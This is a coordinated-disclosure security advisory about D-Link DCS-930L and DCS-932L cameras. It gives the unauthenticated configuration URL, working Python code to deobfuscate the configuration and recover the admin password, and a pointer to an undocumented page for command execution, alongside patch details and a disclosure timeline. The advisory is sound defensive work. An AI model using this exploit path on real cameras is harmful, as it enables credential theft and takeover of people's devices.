===================================================

[ADVISORY INFORMATION]
Title:    Unauthenticated remote access to D-Link DCS cameras
Discovery date: 20/06/2012
Release date:   28/01/2013

[VULNERABILITY INFORMATION]
Class:           Authentication bypass, Remote command execution

[AFFECTED PRODUCTS]
This security vulnerability affects the following products and firmware
versions:
   * D-Link DCS-930L, firmware version 1.04
   * D-Link DCS-932L, firmware version 1.02
Other products and firmware versions are probably also vulnerable, but they
were not checked.

[VULNERABILITY DETAILS]
D-Link DCS web cameras allow unauthenticated attackers to obtain the
configuration of the device remotely. A copy of the device configuration can be
obtained by accessing the following URL:

  http://<device IP address>/frame/GetConfig

The obtained configuration file is obfuscated using a trivial obfuscation
scheme. Python code for the deobfuscation follows (sorry, the code is quite a
mess :-)):

<cut>
# 'data' holds the content of the obfuscated configuration file
def deobfuscate(data):
    r = []
    for c in data:
        c = ord(c)
        c = (c + ord('y')) & 0xff
        c = (c ^ ord('Z')) & 0xff
        c = (c - ord('e')) & 0xff
        r.append(c)

    tmp = None
    i = len(r) - 1
    while i >= 0:
        if i == len(r) - 1:
            x = r[i]
            tmp = ((x & 7) << 5) & 0xff

        if i == 0:
            assert tmp is not None
            x = r[0]
            x = (x >> 3) & 0xff
            x = (x + tmp) & 0xff
            r[0] = x
        else:
            c1 = r[i-1]
            c2 = r[i]
            c1 = c1 & 0x7
            c2 = (c2 >> 3) & 0xff
            c1 = (c1 << 5) & 0xff
            c2 = (c2 + c1) & 0xff
            r[i] = c2
        i = i - 1

    r = "".join([chr(x) for x in r])

    s = ""
    assert (len(r) % 2) == 0
    for i in range(len(r)/2):
        s += r[i+(len(r)/2)] + r[i]

    return s
</cut>

The above procedure returns the deobfuscated ASCII version of the
configuration file. This file includes, among other things, also the web
password for the "admin" user.

As a side note, it is worth considering that, after exploiting this issue,
authenticated attackers can also leverage the undocumented /docmd.htm web page
to execute arbitrary commands on the affected devices.

[REMEDIATION]
This issue has been addressed by D-Link in the following firmware releases:
* DCS-930L V1.06B5 (August 15, 2012)
* DCS-932L V1.04B5 (August 15, 2012)

These updates are available through mydlink.com and have also been implemented
on DCS-942L and higher camera products.

[DISCLOSURE TIME-LINE]
    * 20/06/2012 - Initial vendor contact.

    * 11/07/2012 - The author provided D-Link with the details of the
                   vulnerability.

    * 12/07/2012 - D-Link confirmed the issue is a new security vulnerability.

    * 26/01/2013 - D-Link confirmed the release of firmware versions that
             address the vulnerability.

    * 28/01/2013 - Public disclosure.
